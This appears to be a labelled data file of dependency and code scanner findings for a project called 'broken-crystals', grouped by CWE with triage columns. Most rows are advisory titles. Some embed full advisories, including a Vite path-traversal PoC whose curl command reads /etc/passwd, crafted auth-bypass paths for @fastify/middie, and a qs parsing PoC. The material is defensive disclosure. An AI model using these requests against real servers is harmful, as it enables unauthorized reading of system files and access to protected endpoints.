GRP-broken-crystals-CWE-190-229,trivy,broken-crystals,CWE-190,high,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
GRP-broken-crystals-CWE-190-230,trivy,broken-crystals,CWE-190,medium,libmount-dev@2.33.1-0.1,util-linux: integer overflow can lead to buffer overflow in get_sem_elements() in sys-utils/ipcutils.c,pending,low,no,1
GRP-broken-crystals-CWE-190-231,trivy,broken-crystals,CWE-190,medium,libmount1@2.33.1-0.1,util-linux: integer overflow can lead to buffer overflow in get_sem_elements() in sys-utils/ipcutils.c,pending,low,no,1
GRP-broken-crystals-CWE-190-232,trivy,broken-crystals,CWE-190,medium,libopenexr-dev@2.2.1-4.1+deb10u2,An issue in Academy Software Foundation openexr v.3.2.3 and before all ...,pending,low,no,1
GRP-broken-crystals-CWE-190-233,trivy,broken-crystals,CWE-190,medium,libopenexr23@2.2.1-4.1+deb10u2,An issue in Academy Software Foundation openexr v.3.2.3 and before all ...,pending,low,no,1
GRP-broken-crystals-CWE-190-234,trivy,broken-crystals,CWE-190,medium,libopenjp2-7@2.3.0-2+deb10u2,openjpeg: out-of-bounds write due to an integer overflow in opj_compress.c,pending,low,no,1
GRP-broken-crystals-CWE-190-235,trivy,broken-crystals,CWE-190,medium,libopenjp2-7-dev@2.3.0-2+deb10u2,openjpeg: out-of-bounds write due to an integer overflow in opj_compress.c,pending,low,no,1
GRP-broken-crystals-CWE-190-236,trivy,broken-crystals,CWE-190,medium,libpcre16-3@2:8.39-12,pcre: Integer overflow when parsing callout numeric arguments,pending,low,no,1
GRP-broken-crystals-CWE-190-237,trivy,broken-crystals,CWE-190,medium,libpcre3@2:8.39-12,pcre: Integer overflow when parsing callout numeric arguments,pending,low,no,1
GRP-broken-crystals-CWE-190-238,trivy,broken-crystals,CWE-190,medium,libpcre3-dev@2:8.39-12,pcre: Integer overflow when parsing callout numeric arguments,pending,low,no,1
GRP-broken-crystals-CWE-190-239,trivy,broken-crystals,CWE-190,medium,libpcre32-3@2:8.39-12,pcre: Integer overflow when parsing callout numeric arguments,pending,low,no,1
GRP-broken-crystals-CWE-190-240,trivy,broken-crystals,CWE-190,medium,libpcrecpp0v5@2:8.39-12,pcre: Integer overflow when parsing callout numeric arguments,pending,low,no,1
GRP-broken-crystals-CWE-190-241,trivy,broken-crystals,CWE-190,high,libpq-dev@11.19-0+deb10u1,postgresql: Buffer overrun from integer overflow in array modification,pending,low,no,1
GRP-broken-crystals-CWE-190-242,trivy,broken-crystals,CWE-190,high,libpq5@11.19-0+deb10u1,postgresql: Buffer overrun from integer overflow in array modification,pending,low,no,1
GRP-broken-crystals-CWE-190-243,trivy,broken-crystals,CWE-190,medium,libsmartcols1@2.33.1-0.1,util-linux: integer overflow can lead to buffer overflow in get_sem_elements() in sys-utils/ipcutils.c,pending,low,no,1
GRP-broken-crystals-CWE-190-244,trivy,broken-crystals,CWE-190,high,libssh2-1@1.8.0-2.1,libssh2: integer overflow in SSH_MSG_DISCONNECT logic in packet.c,pending,low,no,1
GRP-broken-crystals-CWE-190-245,trivy,broken-crystals,CWE-190,medium,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: integer overflow in tiffcp.c,pending,low,no,1
GRP-broken-crystals-CWE-190-246,trivy,broken-crystals,CWE-190,medium,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: integer overflow in tiffcp.c,pending,low,no,1
GRP-broken-crystals-CWE-190-247,trivy,broken-crystals,CWE-190,medium,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: integer overflow in tiffcp.c,pending,low,no,1
GRP-broken-crystals-CWE-190-248,trivy,broken-crystals,CWE-190,medium,libuuid1@2.33.1-0.1,util-linux: integer overflow can lead to buffer overflow in get_sem_elements() in sys-utils/ipcutils.c,pending,low,no,1
GRP-broken-crystals-CWE-190-249,trivy,broken-crystals,CWE-190,high,linux-libc-dev@4.19.269-1,kernel: Integer overflow in Intel(R) Graphics Drivers,pending,low,no,1
GRP-broken-crystals-CWE-190-250,trivy,broken-crystals,CWE-190,medium,mount@2.33.1-0.1,util-linux: integer overflow can lead to buffer overflow in get_sem_elements() in sys-utils/ipcutils.c,pending,low,no,1
GRP-broken-crystals-CWE-190-251,trivy,broken-crystals,CWE-190,medium,util-linux@2.33.1-0.1,util-linux: integer overflow can lead to buffer overflow in get_sem_elements() in sys-utils/ipcutils.c,pending,low,no,1
GRP-broken-crystals-CWE-190-252,trivy,broken-crystals,CWE-190,medium,uuid-dev@2.33.1-0.1,util-linux: integer overflow can lead to buffer overflow in get_sem_elements() in sys-utils/ipcutils.c,pending,low,no,1
GRP-broken-crystals-CWE-190-253,trivy,broken-crystals,CWE-190,critical,zlib1g@1:1.2.11.dfsg-1+deb10u2,zlib: integer overflow and resultant heap-based buffer overflow in zipOpenNewFileInZip4_6,pending,low,no,1
GRP-broken-crystals-CWE-190-254,trivy,broken-crystals,CWE-190,critical,zlib1g-dev@1:1.2.11.dfsg-1+deb10u2,zlib: integer overflow and resultant heap-based buffer overflow in zipOpenNewFileInZip4_6,pending,low,no,1
GRP-broken-crystals-CWE-191-255,trivy,broken-crystals,CWE-191,medium,linux-libc-dev@4.19.269-1,kernel: nilfs2: fix underflow in second superblock position calculations,pending,low,no,1
GRP-broken-crystals-CWE-193-256,trivy,broken-crystals,CWE-193,medium,libsystemd0@241-7~deb10u9,systemd: buffer overrun in format_timespan() function,pending,low,no,1
GRP-broken-crystals-CWE-193-257,trivy,broken-crystals,CWE-193,medium,libudev1@241-7~deb10u9,systemd: buffer overrun in format_timespan() function,pending,low,no,1
GRP-broken-crystals-CWE-193-258,trivy,broken-crystals,CWE-193,medium,linux-libc-dev@4.19.269-1,"kernel: off-by-one error for an RDS_MSG_RX_DGRAM_TRACE_MAX comparison, resulting in out-of-bounds access",pending,low,no,1
GRP-broken-crystals-CWE-20-259,npm-audit,broken-crystals,CWE-20,high,nodemailer,Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict,pending,low,no,1
GRP-broken-crystals-CWE-20-260,dep-check,broken-crystals,CWE-20,high,@fastify/middie:8.3.3,"## Summary A path normalization inconsistency in `@fastify/middie` can result in authentication/authorization bypass when using path-scoped middleware (for example, `app.use('/secret', auth)`). When Fastify router normalization options are enabled (such as `ignoreDuplicateSlashes`, `useSemicolonDelimiter`, and related trailing-slash behavior), crafted request paths may bypass middleware checks while still being routed to protected handlers. ## Impact An unauthenticated remote attacker can access endpoints intended to be protected by middleware-based auth/authorization controls by sending specially crafted URL paths (for example, `//secret` or `/secret;foo=bar`), depending on router option configuration. This may lead to unauthorized access to protected functionality and data exposure. ## Affected versions - Confirmed affected: `@fastify/middie@9.1.0` - All versions prior to the patch are affected. ## Patched versions - Fixed in: *9.2.0* ## Details The issue is caused by canonicalization drift between: 1. `@fastify/middie` path matching for `app.use('/prefix', ...)`, and 2. Fastify/find-my-way route lookup normalization. Because middleware and router did not always evaluate the same normalized path, auth middleware could be skipped while route resolution still succeeded. ## Workarounds Until patched version is deployed: - Avoid relying solely on path-scoped middie guards for auth/authorization. - Enforce auth at route-level handlers/hooks after router normalization. - Disable risky normalization combinations only if operationally feasible. ## Resources - Fluid Attacks Disclosure Policy: https://fluidattacks.com/advisories/policy - Fluid Attacks advisory URL: https://fluidattacks.com/advisories/jimenez ## Credits - **Cristian Vargas** (Fluid Attacks Research Team) — discovery and report. - **Oscar Uribe** (Fluid Attacks) — coordination and disclosure.",pending,low,no,1
GRP-broken-crystals-CWE-20-261,dep-check,broken-crystals,CWE-20,high,qs:6.10.4,"### Summary The `arrayLimit` option in qs did not enforce limits for bracket notation (`a[]=1&a[]=2`), only for indexed notation (`a[0]=1`). This is a consistency bug; `arrayLimit` should apply uniformly across all array notations. **Note:** The default `parameterLimit` of 1000 effectively mitigates the DoS scenario originally described. With default options, bracket notation cannot produce arrays larger than `parameterLimit` regardless of `arrayLimit`, because each `a[]=value` consumes one parameter slot. The severity has been reduced accordingly. ### Details The `arrayLimit` option only checked limits for indexed notation (`a[0]=1&a[1]=2`) but did not enforce it for bracket notation (`a[]=1&a[]=2`). **Vulnerable code** (`lib/parse.js:159-162`): ```javascript if (root === '[]' && options.parseArrays) { obj = utils.combine([], leaf); // No arrayLimit check } ``` **Working code** (`lib/parse.js:175`): ```javascript else if (index <= options.arrayLimit) { // Limit checked here obj = []; obj[index] = leaf; } ``` The bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays. ### PoC ```javascript const qs = require('qs'); const result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 }); console.log(result.a.length); // Output: 6 (should be max 5) ``` **Note on parameterLimit interaction:** The original advisory's ""DoS demonstration"" claimed a length of 10,000, but `parameterLimit` (default: 1000) caps parsing to 1,000 parameters. With default options, the actual output is 1,000, not 10,000. ### Impact Consistency bug in `arrayLimit` enforcement. With default `parameterLimit`, the practical DoS risk is negligible since `parameterLimit` already caps the total number of parsed parameters (and thus array elements from bracket notation). The risk increases only when `parameterLimit` is explicitly set to a very high value.",pending,low,no,1
GRP-broken-crystals-CWE-20-262,trivy,broken-crystals,CWE-20,low,coreutils@8.30-3,coreutils: Non-privileged session can escape to the parent session in chroot,pending,low,no,1
GRP-broken-crystals-CWE-20-263,trivy,broken-crystals,CWE-20,medium,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-264,trivy,broken-crystals,CWE-20,medium,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-265,trivy,broken-crystals,CWE-20,medium,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-266,trivy,broken-crystals,CWE-20,high,libidn2-0@2.0.5-1+deb10u1,GNU libidn2 before 2.2.0 fails to perform the roundtrip checks specifi ...,pending,low,no,1
GRP-broken-crystals-CWE-20-267,trivy,broken-crystals,CWE-20,high,libidn2-dev@2.0.5-1+deb10u1,GNU libidn2 before 2.2.0 fails to perform the roundtrip checks specifi ...,pending,low,no,1
GRP-broken-crystals-CWE-20-268,trivy,broken-crystals,CWE-20,medium,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-269,trivy,broken-crystals,CWE-20,medium,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-270,trivy,broken-crystals,CWE-20,medium,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-271,trivy,broken-crystals,CWE-20,medium,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-272,trivy,broken-crystals,CWE-20,medium,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-273,trivy,broken-crystals,CWE-20,medium,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-274,trivy,broken-crystals,CWE-20,medium,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-275,trivy,broken-crystals,CWE-20,medium,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-276,trivy,broken-crystals,CWE-20,medium,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-277,trivy,broken-crystals,CWE-20,medium,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-278,trivy,broken-crystals,CWE-20,high,libpq-dev@11.19-0+deb10u1,postgresql: schema_element defeats protective search_path changes,pending,low,no,1
GRP-broken-crystals-CWE-20-279,trivy,broken-crystals,CWE-20,high,libpq5@11.19-0+deb10u1,postgresql: schema_element defeats protective search_path changes,pending,low,no,1
GRP-broken-crystals-CWE-20-280,trivy,broken-crystals,CWE-20,high,libpython2.7-minimal@2.7.16-2+deb10u1,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-281,trivy,broken-crystals,CWE-20,high,libpython2.7-stdlib@2.7.16-2+deb10u1,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-282,trivy,broken-crystals,CWE-20,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-283,trivy,broken-crystals,CWE-20,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-284,trivy,broken-crystals,CWE-20,medium,linux-libc-dev@4.19.269-1,kernel: Improper input validation in some Intel(R) Graphics Drivers,pending,low,no,1
GRP-broken-crystals-CWE-20-285,trivy,broken-crystals,CWE-20,high,python2.7@2.7.16-2+deb10u1,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-286,trivy,broken-crystals,CWE-20,high,python2.7-minimal@2.7.16-2+deb10u1,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-287,trivy,broken-crystals,CWE-20,high,python3.7@3.7.3-2+deb10u4,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-288,trivy,broken-crystals,CWE-20,high,python3.7-minimal@3.7.3-2+deb10u4,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-289,trivy,broken-crystals,CWE-20,high,@fastify/middie@8.1.0,@fastify/middie has Improper Path Normalization when Using Path-Scoped Middleware,pending,low,no,1
GRP-broken-crystals-CWE-20-290,trivy,broken-crystals,CWE-20,medium,follow-redirects@1.15.2,follow-redirects: Improper Input Validation due to the improper handling of URLs by the url.parse(),pending,low,no,1
GRP-broken-crystals-CWE-20-291,trivy,broken-crystals,CWE-20,high,libxmljs@0.19.7,Denial of service vulnerability exists in libxmljs,pending,low,no,1
GRP-broken-crystals-CWE-20-292,trivy,broken-crystals,CWE-20,high,qs@6.5.3,qs: qs: Denial of Service via improper input validation in array parsing,pending,low,no,1
GRP-broken-crystals-CWE-200-293,dep-check,broken-crystals,CWE-200,info,vite:5.4.10,"### Summary The contents of arbitrary files can be returned to the browser if the dev server is running on Node or Bun. ### Impact Only apps with the following conditions are affected. - explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) - running the Vite dev server on runtimes that are not Deno (e.g. Node, Bun) ### Details [HTTP 1.1 spec (RFC 9112) does not allow `#` in `request-target`](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2). Although an attacker can send such a request. For those requests with an invalid `request-line` (it includes `request-target`), the spec [recommends to reject them with 400 or 301](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2-4). The same can be said for HTTP 2 ([ref1](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-2.4.1), [ref2](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-3), [ref3](https://datatracker.ietf.org/doc/html/rfc9113#section-8.1.1-3)). On Node and Bun, those requests are not rejected internally and is passed to the user land. For those requests, the value of [`http.IncomingMessage.url`](https://nodejs.org/docs/latest-v22.x/api/http.html#messageurl) contains `#`. Vite assumed `req.url` won't contain `#` when checking `server.fs.deny`, allowing those kinds of requests to bypass the check. On Deno, those requests are not rejected internally and is passed to the user land as well. But for those requests, the value of `http.IncomingMessage.url` did not contain `#`. ### PoC ``` npm create vite@latest cd vite-project/ npm install npm run dev ``` send request to read `/etc/passwd` ``` curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173 ```",TP,medium,yes,1
GRP-broken-crystals-CWE-200-294,trivy,broken-crystals,CWE-200,low,curl@7.64.0-4+deb10u5,curl: more POST-after-PUT confusion,TP,medium,yes,1
GRP-broken-crystals-CWE-200-295,trivy,broken-crystals,CWE-200,high,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-296,trivy,broken-crystals,CWE-200,high,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-297,trivy,broken-crystals,CWE-200,high,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-298,trivy,broken-crystals,CWE-200,low,libcurl3-gnutls@7.64.0-4+deb10u5,curl: more POST-after-PUT confusion,TP,medium,yes,1
GRP-broken-crystals-CWE-200-299,trivy,broken-crystals,CWE-200,low,libcurl4@7.64.0-4+deb10u5,curl: more POST-after-PUT confusion,TP,medium,yes,1
GRP-broken-crystals-CWE-200-300,trivy,broken-crystals,CWE-200,low,libcurl4-openssl-dev@7.64.0-4+deb10u5,curl: more POST-after-PUT confusion,TP,medium,yes,1
GRP-broken-crystals-CWE-200-301,trivy,broken-crystals,CWE-200,high,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-302,trivy,broken-crystals,CWE-200,high,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-303,trivy,broken-crystals,CWE-200,high,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-304,trivy,broken-crystals,CWE-200,high,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-305,trivy,broken-crystals,CWE-200,high,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-306,trivy,broken-crystals,CWE-200,high,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-307,trivy,broken-crystals,CWE-200,high,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-308,trivy,broken-crystals,CWE-200,high,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-309,trivy,broken-crystals,CWE-200,high,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-310,trivy,broken-crystals,CWE-200,high,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-311,trivy,broken-crystals,CWE-200,medium,libpython3.7-minimal@3.7.3-2+deb10u4,python: Information disclosure via pydoc,TP,medium,yes,1
GRP-broken-crystals-CWE-200-312,trivy,broken-crystals,CWE-200,medium,libpython3.7-stdlib@3.7.3-2+deb10u4,python: Information disclosure via pydoc,TP,medium,yes,1
GRP-broken-crystals-CWE-200-313,trivy,broken-crystals,CWE-200,medium,libsystemd0@241-7~deb10u9,systemd: local information leak due to systemd-coredump not respecting fs.suid_dumpable kernel setting,TP,medium,yes,1
GRP-broken-crystals-CWE-200-314,trivy,broken-crystals,CWE-200,medium,libudev1@241-7~deb10u9,systemd: local information leak due to systemd-coredump not respecting fs.suid_dumpable kernel setting,TP,medium,yes,1
GRP-broken-crystals-CWE-200-315,trivy,broken-crystals,CWE-200,medium,linux-libc-dev@4.19.269-1,kernel: Information disclosure in vhost/vhost.c:vhost_new_msg(),TP,medium,yes,1
GRP-broken-crystals-CWE-200-316,trivy,broken-crystals,CWE-200,medium,python3.7@3.7.3-2+deb10u4,python: Information disclosure via pydoc,TP,medium,yes,1
GRP-broken-crystals-CWE-200-317,trivy,broken-crystals,CWE-200,medium,python3.7-minimal@3.7.3-2+deb10u4,python: Information disclosure via pydoc,TP,medium,yes,1
GRP-broken-crystals-CWE-200-318,trivy,broken-crystals,CWE-200,medium,follow-redirects@1.15.2,follow-redirects: Possible credential leak,TP,medium,yes,1
GRP-broken-crystals-CWE-200-319,trivy,broken-crystals,CWE-200,low,undici@5.21.0,node-undici: cookie leakage,TP,medium,yes,1
GRP-broken-crystals-CWE-203-320,trivy,broken-crystals,CWE-203,high,libgcrypt20@1.8.4-5+deb10u1,libgcrypt: mishandles ElGamal encryption because it lacks exponent blinding to address a side-channel attack against mpi_powm,pending,low,no,1
GRP-broken-crystals-CWE-203-321,trivy,broken-crystals,CWE-203,medium,linux-libc-dev@4.19.269-1,amd: Return Address Predictor vulnerability leading to information disclosure,pending,low,no,1
GRP-broken-crystals-CWE-208-322,trivy,broken-crystals,CWE-208,medium,libgnutls-dane0@3.6.7-4+deb10u10,gnutls: timing side-channel in the RSA-PSK authentication,pending,low,no,1
GRP-broken-crystals-CWE-208-323,trivy,broken-crystals,CWE-208,medium,libgnutls-openssl27@3.6.7-4+deb10u10,gnutls: timing side-channel in the RSA-PSK authentication,pending,low,no,1
GRP-broken-crystals-CWE-208-324,trivy,broken-crystals,CWE-208,medium,libgnutls28-dev@3.6.7-4+deb10u10,gnutls: timing side-channel in the RSA-PSK authentication,pending,low,no,1
GRP-broken-crystals-CWE-208-325,trivy,broken-crystals,CWE-208,medium,libgnutls30@3.6.7-4+deb10u10,gnutls: timing side-channel in the RSA-PSK authentication,pending,low,no,1
GRP-broken-crystals-CWE-208-326,trivy,broken-crystals,CWE-208,medium,libgnutlsxx28@3.6.7-4+deb10u10,gnutls: timing side-channel in the RSA-PSK authentication,pending,low,no,1
GRP-broken-crystals-CWE-208-327,bearer,broken-crystals,CWE-208,info,src/auth/csrf.guard.ts:36,"## Description Observable Timing Discrepancy occurs when the time it takes for certain operations to complete can be measured and observed by attackers. This vulnerability is particularly concerning when operations involve sensitive information, such as password checks or secret comparisons. If attackers can analyze how long these operations take, they might be able to deduce confidential details, putting your data at risk. ## Remediations - **Do** implement algorithms that process sensitive information in constant time. This approach helps prevent attackers from guessing secrets based on the duration of operations. - **Do** use built-in security features and cryptographic libraries that offer functions safe from timing attacks for comparing secret values. - **Do not** use direct string comparisons for sensitive information, as this can lead to early termination of the function if a mismatch is found, revealing timing information. ```javascript if (apiToken === ""zDE9ET!TDq2uZx2oM!FD2"") { // unsafe ... } ``` - **Do not** design application logic that changes execution paths in a manner that could introduce timing discrepancies based on user input or secret values. ## References - [OWASP Guide to Cryptography](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html) - [MDN Web Docs on SubtleCrypto API](https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto)",pending,low,no,1
GRP-broken-crystals-CWE-209-328,trivy,broken-crystals,CWE-209,high,cpp-8@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-329,trivy,broken-crystals,CWE-209,high,g++-8@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-330,trivy,broken-crystals,CWE-209,high,gcc-8@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-331,trivy,broken-crystals,CWE-209,high,gcc-8-base@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-332,trivy,broken-crystals,CWE-209,high,libasan5@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-333,trivy,broken-crystals,CWE-209,high,libatomic1@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-334,trivy,broken-crystals,CWE-209,high,libcc1-0@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-335,trivy,broken-crystals,CWE-209,high,libgcc-8-dev@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-336,trivy,broken-crystals,CWE-209,high,libgcc1@1:8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-337,trivy,broken-crystals,CWE-209,high,libgomp1@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-338,trivy,broken-crystals,CWE-209,high,libitm1@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-339,trivy,broken-crystals,CWE-209,high,liblsan0@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-340,trivy,broken-crystals,CWE-209,high,libmpx2@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-341,trivy,broken-crystals,CWE-209,high,libquadmath0@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-342,trivy,broken-crystals,CWE-209,high,libstdc++-8-dev@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-343,trivy,broken-crystals,CWE-209,high,libstdc++6@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-344,trivy,broken-crystals,CWE-209,high,libtsan0@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-345,trivy,broken-crystals,CWE-209,high,libubsan1@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-346,trivy,broken-crystals,CWE-209,medium,linux-libc-dev@4.19.269-1,hw: amd: Cross-Process Information Leak,TP,medium,yes,1
GRP-broken-crystals-CWE-212-347,trivy,broken-crystals,CWE-212,medium,linux-libc-dev@4.19.269-1,hw: cpu: AMD: RetBleed Arbitrary Speculative Code Execution with Return Instructions,pending,low,no,1
